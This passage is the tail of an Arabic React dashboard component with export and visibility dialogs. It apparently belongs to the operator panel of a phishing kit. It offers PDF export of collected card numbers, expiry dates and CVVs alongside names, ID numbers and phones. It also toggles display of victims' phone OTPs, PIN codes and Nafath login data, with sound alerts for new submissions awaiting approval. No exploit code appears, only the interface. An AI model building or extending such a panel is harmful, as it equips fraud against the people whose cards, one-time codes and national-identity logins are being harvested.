            className="w-9 h-9 text-gray-400 hover:text-blue-600 hover:bg-blue-50 rounded-lg"
            data-testid="button-archive"
          >
            <Archive size={18} />
          </Button>
          <div className="h-px w-6 bg-gray-100 mx-auto" />
          <Button
            variant="ghost"
            size="icon"
            className="w-9 h-9 text-blue-500 bg-blue-50 rounded-lg shadow-inner shadow-blue-100"
            data-testid="button-star"
          >
            <Star size={18} className="fill-current" />
          </Button>
          <Button
            variant="ghost"
            size="icon"
            className="w-9 h-9 text-gray-400 hover:text-blue-600 hover:bg-blue-50 rounded-lg"
            data-testid="button-flag"
          >
            <Flag size={18} />
          </Button>
        </div>

        <div className="flex-1 w-full flex flex-col items-center justify-center gap-1">
          <div className="h-px w-6 bg-gray-100 mb-2" />
          <div className="flex flex-col items-center gap-1 text-[9px] text-gray-300 font-mono group cursor-pointer hover:text-gray-500 transition-colors">
            <Clock
              size={16}
              className="group-hover:text-gray-500 transition-colors"
            />
            <span>0-3</span>
          </div>
        </div>

        <div className="mt-auto pb-2">
          <Button
            variant="ghost"
            size="icon"
            className="w-10 h-10 rounded-full bg-blue-600 text-white hover:bg-blue-700 shadow-lg hover:shadow-xl transition-all hover:scale-105 active:scale-95"
            data-testid="button-message"
          >
            <MessageSquare size={18} />
          </Button>
        </div>
      </aside>

      {/* Warning Settings Dialog */}
      <Dialog open={settingsDialogOpen} onOpenChange={setSettingsDialogOpen}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-right">
              إعدادات تنبيهات الموافقة
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-6 py-4">
            <div className="flex items-center justify-between">
              <Label htmlFor="enabled" className="text-sm font-medium">
                تفعيل التنبيهات
              </Label>
              <Switch
                id="enabled"
                checked={warningSettings.enabled}
                onCheckedChange={(checked) =>
                  handleWarningSettingChange("enabled", checked)
                }
                data-testid="switch-warning-enabled"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="headline" className="text-sm font-medium">
                عنوان التنبيه
              </Label>
              <Input
                id="headline"
                value={warningSettings.headline}
                onChange={(e) =>
                  handleWarningSettingChange("headline", e.target.value)
                }
                className="text-right"
                data-testid="input-warning-headline"
              />
            </div>

            <div className="flex items-center justify-between">
              <Label htmlFor="showCardCount" className="text-sm font-medium">
                عرض عدد البطاقات
              </Label>
              <Switch
                id="showCardCount"
                checked={warningSettings.showCardCount}
                onCheckedChange={(checked) =>
                  handleWarningSettingChange("showCardCount", checked)
                }
                data-testid="switch-show-card-count"
              />
            </div>

            <div className="flex items-center justify-between">
              <Label htmlFor="showPhoneCount" className="text-sm font-medium">
                عرض عدد الهواتف
              </Label>
              <Switch
                id="showPhoneCount"
                checked={warningSettings.showPhoneCount}
                onCheckedChange={(checked) =>
                  handleWarningSettingChange("showPhoneCount", checked)
                }
                data-testid="switch-show-phone-count"
              />
            </div>

            <div className="space-y-2">
              <Label htmlFor="accentColor" className="text-sm font-medium">
                لون التنبيه
              </Label>
              <div className="flex gap-2">
                <input
                  type="color"
                  id="accentColor"
                  value={warningSettings.accentColor}
                  onChange={(e) =>
                    handleWarningSettingChange("accentColor", e.target.value)
                  }
                  className="w-12 h-10 rounded border cursor-pointer"
                  data-testid="input-accent-color"
                />
                <Input
                  value={warningSettings.accentColor}
                  onChange={(e) =>
                    handleWarningSettingChange("accentColor", e.target.value)
                  }
                  className="flex-1 font-mono text-sm"
                  dir="ltr"
                />
              </div>
              <div className="flex gap-2 mt-2">
                {[
                  "#ef4444",
                  "#f59e0b",
                  "#10b981",
                  "#3b82f6",
                  "#8b5cf6",
                  "#ec4899",
                ].map((color) => (
                  <button
                    key={color}
                    onClick={() =>
                      handleWarningSettingChange("accentColor", color)
                    }
                    className="w-8 h-8 rounded-full border-2 transition-transform hover:scale-110"
                    style={{
                      backgroundColor: color,
                      borderColor:
                        warningSettings.accentColor === color
                          ? "#000"
                          : "transparent",
                    }}
                    data-testid={`color-${color}`}
                  />
                ))}
              </div>
            </div>

            <div className="flex items-center justify-between">
              <Label htmlFor="soundEnabled" className="text-sm font-medium">
                تفعيل الصوت
              </Label>
              <Switch
                id="soundEnabled"
                checked={warningSettings.soundEnabled}
                onCheckedChange={(checked) =>
                  handleWarningSettingChange("soundEnabled", checked)
                }
                data-testid="switch-sound-enabled"
              />
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Export Dialog */}
      <Dialog open={exportDialogOpen} onOpenChange={setExportDialogOpen}>
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-right flex items-center gap-2">
              <FileDown size={20} className="text-blue-500" />
              تصدير البيانات
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <div className="bg-blue-50 border border-blue-200 rounded-lg p-4">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <CreditCard size={18} className="text-blue-600" />
                  <span className="font-medium text-blue-900">
                    بطاقات الدفع
                  </span>
                </div>
                <Badge className="bg-blue-500">
                  {applications.filter((a) => a.cardNumber).length}
                </Badge>
              </div>
              <p className="text-xs text-blue-700 mb-3">
                تصدير جميع بيانات البطاقات (رقم البطاقة، تاريخ الانتها �، CVV،
                الحالة)
              </p>
              <Button
                onClick={exportCardsToPDF}
                className="w-full bg-blue-600 hover:bg-blue-700"
                data-testid="button-export-cards"
              >
                <Download size={16} className="ml-2" />
                تصدير البطاقات PDF
              </Button>
            </div>

            <div className="bg-gray-50 border border-gray-200 rounded-lg p-4">
              <div className="flex items-center justify-between mb-2">
                <div className="flex items-center gap-2">
                  <FileText size={18} className="text-gray-600" />
                  <span className="font-medium text-gray-900">
                    جميع الطلبات
                  </span>
                </div>
                <Badge variant="secondary">{applications.length}</Badge>
              </div>
              <p className="text-xs text-gray-600 mb-3">
                تصدير ملخص جميع الطلبات (الاسم، الهوية، الهاتف، الحالة)
              </p>
              <Button
                onClick={exportAllDataToPDF}
                variant="outline"
                className="w-full"
                data-testid="button-export-all"
              >
                <Download size={16} className="ml-2" />
                تصدير الكل PDF
              </Button>
            </div>

            <div className="text-center text-xs text-gray-400 pt-2">
              سيتم تنزيل الملف تلقائياً
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Visibility Settings Dialog */}
      <Dialog
        open={visibilityDialogOpen}
        onOpenChange={setVisibilityDialogOpen}
      >
        <DialogContent className="max-w-md" dir="rtl">
          <DialogHeader>
            <DialogTitle className="text-right flex items-center gap-2">
              <Eye size={20} className="text-blue-500" />
              إعدادات عرض البيانات
            </DialogTitle>
          </DialogHeader>
          <div className="space-y-4 py-4">
            <p className="text-sm text-muted-foreground mb-4">
              اختر الأقسام التي تريد عرضها في صفحة التفاصيل
            </p>

            <Accordion
              type="single"
              collapsible
              className="w-full"
              defaultValue="sections"
            >
              <AccordionItem value="sections" className="border rounded-lg">
                <AccordionTrigger className="px-4 py-3 hover:no-underline">
                  <div className="flex items-center gap-2">
                    <Settings size={16} className="text-blue-500" />
                    <span className="font-medium">أقسام البيانات</span>
                    <Badge variant="secondary" className="mr-2">
                      {Object.values(visibilitySettings).filter(Boolean).length}{" "}
                      / {Object.keys(visibilitySettings).length}
                    </Badge>
                  </div>
                </AccordionTrigger>
                <AccordionContent className="px-4 pb-4">
                  <div className="space-y-2">
                    <div className="flex items-center justify-between p-2 hover:bg-muted rounded-md transition-colors">
                      <div className="flex items-center gap-2">
                        <Checkbox
                          id="basicInfo"
                          checked={visibilitySettings.basicInfo}
                          onCheckedChange={(checked) =>
                            handleVisibilityChange(
                              "basicInfo",
                              checked as boolean,
                            )
                          }
                          data-testid="checkbox-visibility-basic-info"
                        />
                        <FileText size={14} className="text-blue-500" />
                        <Label
                          htmlFor="basicInfo"
                          className="text-sm cursor-pointer"
                        >
                          البيانات الأساسية
                        </Label>
                      </div>
                    </div>

                    <div className="flex items-center justify-between p-2 hover:bg-muted rounded-md transition-colors">
                      <div className="flex items-center gap-2">
                        <Checkbox
                          id="paymentCard"
                          checked={visibilitySettings.paymentCard}
                          onCheckedChange={(checked) =>
                            handleVisibilityChange(
                              "paymentCard",
                              checked as boolean,
                            )
                          }
                          data-testid="checkbox-visibility-payment-card"
                        />
                        <CreditCard size={14} className="text-amber-500" />
                        <Label
                          htmlFor="paymentCard"
                          className="text-sm cursor-pointer"
                        >
                          بطاقة الدفع
                        </Label>
                      </div>
                    </div>

                    <div className="flex items-center justify-between p-2 hover:bg-muted rounded-md transition-colors">
                      <div className="flex items-center gap-2">
                        <Checkbox
                          id="phoneOtp"
                          checked={visibilitySettings.phoneOtp}
                          onCheckedChange={(checked) =>
                            handleVisibilityChange(
                              "phoneOtp",
                              checked as boolean,
                            )
                          }
                          data-testid="checkbox-visibility-phone-otp"
                        />
                        <Phone size={14} className="text-blue-500" />
                        <Label
                          htmlFor="phoneOtp"
                          className="text-sm cursor-pointer"
                        >
                          OTP الهاتف
                        </Label>
                      </div>
                    </div>

                    <div className="flex items-center justify-between p-2 hover:bg-muted rounded-md transition-colors">
                      <div className="flex items-center gap-2">
                        <Checkbox
                          id="pin"
                          checked={visibilitySettings.pin}
                          onCheckedChange={(checked) =>
                            handleVisibilityChange("pin", checked as boolean)
                          }
                          data-testid="checkbox-visibility-pin"
                        />
                        <Star size={14} className="text-purple-500" />
                        <Label htmlFor="pin" className="text-sm cursor-pointer">
                          رمز PIN
                        </Label>
                      </div>
                    </div>

                    <div className="flex items-center justify-between p-2 hover:bg-muted rounded-md transition-colors">
                      <div className="flex items-center gap-2">
                        <Checkbox
                          id="phoneVerification"
                          checked={visibilitySettings.phoneVerification}
                          onCheckedChange={(checked) =>
                            handleVisibilityChange(
                              "phoneVerification",
                              checked as boolean,
                            )
                          }
                          data-testid="checkbox-visibility-phone-verification"
                        />
                        <Phone size={14} className="text-teal-500" />
                        <Label
                          htmlFor="phoneVerification"
                          className="text-sm cursor-pointer"
                        >
                          توثيق الهاتف
                        </Label>
                      </div>
                    </div>

                    <div className="flex items-center justify-between p-2 hover:bg-muted rounded-md transition-colors">
                      <div className="flex items-center gap-2">
                        <Checkbox
                          id="idVerification"
                          checked={visibilitySettings.idVerification}
                          onCheckedChange={(checked) =>
                            handleVisibilityChange(
                              "idVerification",
                              checked as boolean,
                            )
                          }
                          data-testid="checkbox-visibility-id-verification"
                        />
                        <User size={14} className="text-indigo-500" />
                        <Label
                          htmlFor="idVerification"
                          className="text-sm cursor-pointer"
                        >
                          توثيق الهوية
                        </Label>
                      </div>
                    </div>

                    <div className="flex items-center justify-between p-2 hover:bg-muted rounded-md transition-colors">
                      <div className="flex items-center gap-2">
                        <Checkbox
                          id="mobileNafaz"
                          checked={visibilitySettings.mobileNafaz}
                          onCheckedChange={(checked) =>
                            handleVisibilityChange(
                              "mobileNafaz",
                              checked as boolean,
                            )
                          }
                          data-testid="checkbox-visibility-mobile-nafaz"
                        />
                        <Globe size={14} className="text-green-500" />
                        <Label
                          htmlFor="mobileNafaz"
                          className="text-sm cursor-pointer"
                        >
                          معلومات الجوال والنفاذ
                        </Label>
                      </div>
                    </div>

                    <div className="flex items-center justify-between p-2 hover:bg-muted rounded-md transition-colors">
                      <div className="flex items-center gap-2">
                        <Checkbox
                          id="nafazSection"
                          checked={visibilitySettings.nafazSection}
                          onCheckedChange={(checked) =>
                            handleVisibilityChange(
                              "nafazSection",
                              checked as boolean,
                            )
                          }
                          data-testid="checkbox-visibility-nafaz-section"
                        />
                        <Lock size={14} className="text-cyan-500" />
                        <Label
                          htmlFor="nafazSection"
                          className="text-sm cursor-pointer"
                        >
                          قسم النفاذ
                        </Label>
                      </div>
                    </div>

                    <div className="flex items-center justify-between p-2 hover:bg-muted rounded-md transition-colors">
                      <div className="flex items-center gap-2">
                        <Checkbox
                          id="rawData"
                          checked={visibilitySettings.rawData}
                          onCheckedChange={(checked) =>
                            handleVisibilityChange(
                              "rawData",
                              checked as boolean,
                            )
                          }
                          data-testid="checkbox-visibility-raw-data"
                        />
                        <List size={14} className="text-gray-500" />
                        <Label
                          htmlFor="rawData"
                          className="text-sm cursor-pointer"
                        >
                          البيانات الخام (Raw)
                        </Label>
                      </div>
                    </div>
                  </div>
                </AccordionContent>
              </AccordionItem>
            </Accordion>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
}
